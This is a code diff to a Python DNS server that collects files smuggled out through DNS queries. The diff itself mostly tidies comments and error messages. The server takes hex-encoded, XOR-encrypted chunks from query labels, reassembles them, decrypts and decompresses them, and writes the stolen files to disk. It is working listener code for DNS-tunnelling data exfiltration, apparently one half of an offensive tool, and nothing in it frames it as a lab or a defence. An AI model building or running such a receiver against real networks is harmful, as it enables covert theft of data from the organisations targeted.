@@ -6,6 +6,7 @@ import gzip
 import sys
 from datetime import datetime
 
+# Color printing utility
 def color(string, color=None):
     colors = {
         'red': '31',
@@ -29,40 +30,36 @@ def color(string, color=None):
     else:
         return string
 
+# Progress bar printing utility
 def print_progress_bar(iteration, total, prefix='', suffix='', decimals=1, length=60, fill='█'):
     percent = ("{0:." + str(decimals) + "f}").format(100 * (iteration / float(total)))
     filled_length = int(length * iteration // total)
     bar = fill * filled_length + '-' * (length - filled_length)
-    sys.stdout.write(f'\r{prefix} |{bar}| {percent}% {suffix}', )
+    sys.stdout.write(f'\r{prefix} |{bar}| {percent}% {suffix}')
     sys.stdout.flush()
     if iteration == total:
         sys.stdout.write('\n')
         sys.stdout.flush()
 
+# DNS data resolver class
 class DataResolver(BaseResolver):
     def __init__(self, password):
         self.data_store = {}  # Dictionary to store data chunks by filename
         self.password = password.encode()
 
     def xor_decrypt(self, data, password):
-        # Create an array to store the decrypted bytes
         decrypted_data = bytearray()
-
-        # Decrypt each byte
         for i in range(len(data)):
             decrypted_byte = data[i] ^ password[i % len(password)]
             decrypted_data.append(decrypted_byte)
-
         return decrypted_data
 
     def resolve(self, request, handler):
         qname = request.q.qname
         labels = str(qname).split('.')
 
-        # Simulate an NXDOMAIN response
         reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
 
-        # Extract metadata and filename from the second last label
         try:
             metadata = labels[5]
             filename_hex, timestamp, number_of_chunks = metadata.split('|')
@@ -72,46 +69,44 @@ class DataResolver(BaseResolver):
             #print(color(f"\n[?] Query with unknown format received!"))
             return reply
 
-        # Prepare the file key
         file_key = f"{timestamp}_{filename}"
 
         if file_key not in self.data_store:
-            self.data_store[file_key] = [None] * int(number_of_chunks)  # Pre-allocate list for all chunks
+            self.data_store[file_key] = [None] * int(number_of_chunks)
             print(color(f"\n[*] Reception of new file {file_key} has started!"))
 
-        # Extract chunk ID and hex-encoded chunks
         chunk_id = int(labels[0])
         hex_chunks = labels[1:5]
         hex_data = ''.join(hex_chunks)
         self.data_store[file_key][chunk_id] = hex_data
 
         print_progress_bar(chunk_id + 1, int(number_of_chunks), prefix=f'Receiving file {file_key}:', suffix='Complete', length=50)
+
         if chunk_id == int(number_of_chunks) - 1:
             chunks = self.data_store[file_key]
             print(color(f"\n[+] Transfer of {file_key} complete!"))
             if None in chunks:
-                print(color(f"\n[!] Missing chunks for {file_key}, file will not be written."))
+                print(color(f"\n[!] Missing chunks for {file_key}, file will not be written.", 'red'))
             else:
                 try:
                     encrypted_data = bytearray.fromhex(''.join(chunks))
                     decrypted_data = self.xor_decrypt(encrypted_data, self.password)
-                    # Check if the file is gzipped by checking the first two bytes (gzip magic number)
                     if decrypted_data[:2] == b'\x1f\x8b':
                         output_file = file_key + ".gz"
                         with open(output_file, 'wb') as f:
                             f.write(decrypted_data)
                         with gzip.open(output_file, 'rb') as gz_file:
                             decompressed_data = gz_file.read()
-                        decompressed_output_file = output_file[:-3]  # Remove .gz extension
+                        decompressed_output_file = output_file[:-3]
                         with open(decompressed_output_file, 'wb') as f:
                             f.write(decompressed_data)
                         print(color(f"\n[+] Data written to {file_key}"))
-
-                except:
-                    print(color(f"\n[!] Failed to decode or write data of {file_key}"))
+                except Exception as e:
+                    print(color(f"\n[!] Failed to decode or write data of {file_key}: {e}", 'red'))
 
         return reply
 
+# No operation logger to suppress output
 class NoOpLogger:
     def log_pass(self, *args, **kwargs):
         pass
@@ -123,20 +118,20 @@ if __name__ == "__main__":
     parser.add_argument("dns_server_ip", help="IP address of the DNS server")
     parser.add_argument("password", help="Password for XOR encryption/decryption")
     parser.add_argument("--usetcp", action="store_true", help="Use TCP instead of UDP")
-    
+
     args = parser.parse_args()
-    
+
     dns_server_ip = args.dns_server_ip
     password = args.password
     use_tcp = args.usetcp
 
-    logger = NoOpLogger()  # Use the no-op logger to suppress output
+    logger = NoOpLogger()
     resolver = DataResolver(password)
     server = DNSServer(resolver, port=53, address=dns_server_ip, logger=logger, tcp=use_tcp)
-    
+
     try:
         server.start_thread()
-        print(color("[+] DNS server started. Press Ctrl+C to stop.\n"))
+        print(color("\n[+] DNS server started. Press Ctrl+C to stop."))
         while True:
             pass
     except KeyboardInterrupt:
